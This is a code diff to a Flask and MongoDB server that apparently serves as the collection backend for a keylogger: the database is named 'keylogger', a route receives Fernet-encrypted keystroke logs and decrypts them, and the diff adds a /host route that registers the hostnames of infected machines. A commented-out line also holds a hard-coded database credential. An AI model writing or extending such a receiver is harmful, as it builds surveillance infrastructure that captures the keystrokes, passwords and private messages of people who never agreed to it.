@@ -3,11 +3,15 @@ from flask_pymongo import PyMongo
 from cryptography.fernet import Fernet
 from logging import exception
 from os import environ
-
-app = Flask(__name__)
+#CONSTANTS
 TABLE = 'keylogger'
 PARAMS = '?authSource=admin'
 URL = environ.get('MONGODB_URL') + TABLE + PARAMS
+MSG_SUCESS = "Insert successfully"
+MSG_EXIST = "Insert already exist"
+MSG_NULL = "Error null values"
+
+app = Flask(__name__)
 app.config['MONGO_URI'] = URL
 #app.config['MONGO_URI']='mongodb://root:admin@localhost/keylogger?authSource=admin'
 mongo = PyMongo(app)
@@ -22,15 +26,31 @@ def decifrar(msg):
     return (TOKEN.decrypt(msg)).decode()
 
 @app.before_first_request
-def create_tables():
+def clear_tables():
     try:
         mongo.db.logs.drop()
     except Exception:
-        print("[SERVER]: Error at create_tables()")
+        print("[SERVER]: Error at clear_tables()")
 
 @app.route('/ping')
 def ping():
     return jsonify({"message": 'Pong!'})
+
+@app.route('/host', methods=['POST'])
+def insertHost():
+    try:
+        data = request.json['hostname']
+        if data:
+            #if mongo.db.hosts.
+            # if mongo.db.hosts.find_one(filter={ "hostname": data['hostname'] }):
+            #     return jsonify({"message": MSG_EXIST})
+            mongo.db.hosts.insert_one(data)
+            data.update({'_id': str(data['_id'])})
+            return jsonify({"message": MSG_SUCESS, "result": data})
+        else:
+            return jsonify({"message": MSG_NULL})
+    except:
+        print("[SERVER]: Error at insertHost()")
 
 @app.route('/log', methods=['GET'])
 def viewLogs():
@@ -74,7 +94,7 @@ def insertLog():
             data.update({'message': str(message),'_id': str(data['_id'])})
             return jsonify({"message": data})
         else:
-            return jsonify({"message": "Error!"})
+            return jsonify({"message": "Nulls values!"})
     except Exception:
         exception("[SERVER]: Error in route /log [POST] ->")
         return jsonify({"message": "Internal Erro r"}), 500
